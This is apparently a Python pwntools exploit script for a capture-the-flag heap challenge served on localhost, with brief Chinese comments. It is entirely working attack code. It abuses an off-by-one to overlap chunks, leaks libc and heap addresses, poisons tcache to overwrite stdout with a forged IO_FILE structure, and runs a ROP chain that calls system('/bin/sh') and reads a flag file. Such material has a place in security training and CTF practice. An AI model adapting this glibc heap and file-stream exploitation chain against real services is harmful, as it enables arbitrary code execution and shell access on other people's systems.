from pwn import *
from pwncli import *

context(os="linux",arch="amd64")
#f=process("./llk")
f=remote("127.0.0.1", 10000)
libc=ELF("./libc.so.6")
#gdb.attach(f)

def menu(number):
    f.recvuntil(b">> ")
    f.sendline(str(number))

def add(size,content):
    menu(1)
    f.sendlineafter(b": ",str(1))
    f.sendlineafter(b": ","m")
    f.sendlineafter(b"Size: ",str(size))
    f.sendafter(b"Content:",content)


def show(index):
    menu(2)
    f.sendlineafter(b": ",str(index))
    f.sendlineafter(b">> ",str(2))



def delete(index):
    menu(3)
    f.sendlineafter(b": ",str(index))
    f.sendlineafter(b">> ",str(2))

add(0x410,"0")#0
add(0x120,"0")#1
add(0x410,"0")#2 合并3的
add(0x440,"0")#3 
add(0x40,"0")#4 off by one写5
add(0x4d0,"0")#5 合并6的
add(0x410,"0")#6
add(0x10,"0")#7 防止合并的

delete(0)
delete(3)
delete(6)
delete(2)

payload=0x410*b"a"+p64(0)+p8(0xa0)+p8(0x4)
add(0x430,payload)# 0 对应原来2
add(0x410,"0")# 2 对应原来6
add(0x410,"0")# 3 对应原来0
add(0x420,"0")# 6 对应原来的3+0x20

delete(3)# 原来0
delete(6)# 原来3+0x20


add(0x410,p64(0)) # 3 原来0
add(0x420,"0") # 6 原来3+0x20

delete(6)
delete(2)
delete(5)


payload=0x4e0*b"a"
add(0x4f0,payload)# 2 原来5
add(0x3f0,"0") # 5 原来6+0x20
add(0x420,"0") # 6  原来3+0x20

delete(4) # 4
payload=0x40*b"a"+p64(0x4a0)
add(0x48,payload) # 4

delete(2)

add(0x10,"0") # 2
show(6) # unsorted bin addr

f.recvuntil("Introduction: ")
unsorted_bin_addr=f.recvuntil("\n")[:-1]
unsorted_bin_addr=u64(unsorted_bin_addr+2*b"\x00")
print("unsorted_bin_addr",hex(unsorted_bin_addr)) # -0x219ce0

libc_base=unsorted_bin_addr-0x219ce0
pop_rdi = libc_base + 0x000000000002a3e5
pop_rsi = libc_base + 0x000000000002be51
pop_rdxr12 = libc_base + 0x000000000011f0f7
ret = libc_base + 0x0000000000029cd6
pop_rax = libc_base + 0x0000000000045eb0
pop_rbp = libc_base + 0x000000000002a2e0
leave_ret = libc_base + 0x000000000004da83
close = libc_base + libc.sym['close']
read = libc_base + libc.sym['read']
write = libc_base + libc.sym['write']
syscallret = libc_base + next(libc.search(asm('syscall\nret')))
stdout = libc.sym['_IO_2_1_stdout_'] + libc_base
system=libc_base+libc.sym["system"]
add(0x300,"0") # 8
add(0x130,"0") # 9
add(0x3f0,"0") # 10
add(0x120,"0") # 11

add(0x3f0,"0") # 12
delete(12)

delete(8)
show(6) # heap addr

f.recvuntil("Introduction: ")
heap_addr=f.recvuntil("\n")[:-1]
heap_addr=int.from_bytes(heap_addr,"little")
heap_addr=heap_addr<<12
print("heap_addr",hex(heap_addr))


add(0x300,"0")# 8
delete(4)
delete(10)

payload=p64(((heap_addr + 0x1080) >> 12) ^ (stdout))[:-1]
payload=0x18*b"a"+p64(0x401)+payload
add(0x40,payload)#4




file1 = IO_FILE_plus_struct()
file1.flags = 0
file1._IO_read_ptr = pop_rbp
file1._IO_read_end = heap_addr + 0x1080  - 8
file1._IO_read_base = leave_ret
file1._IO_write_base = 0
file1._IO_write_ptr = 1
file1._lock = heap_addr 
file1.chain = leave_ret
file1._codecvt =stdout
file1._wide_data =stdout - 0x48
file1.vtable = libc.sym['_IO_wfile_jumps'] + libc_base - 0x20
print("vatable vaule",hex(file1.vtable))


flag_addr = heap_addr+ 0x100+0x1080
payload = p64(pop_rdi) +p64(flag_addr) +p64(system)+ p64(pop_rsi) + p64(0) + p64(pop_rax) + p64(2) + p64(syscallret) + p64(pop_rdi) + p64(3) + p64(pop_rsi) + p64(flag_addr) + p64(pop_rdxr12) + p64(0x50) + p64(0) + p64(read) + p64(pop_rdi) + p64(1) + p64(write)
payload = payload.ljust(0x100, b'\x00')
payload += b'/bin/sh\x00'


add(0x3f0,  payload) #10

add(0x3f0, bytes(file1))

f.interactive()
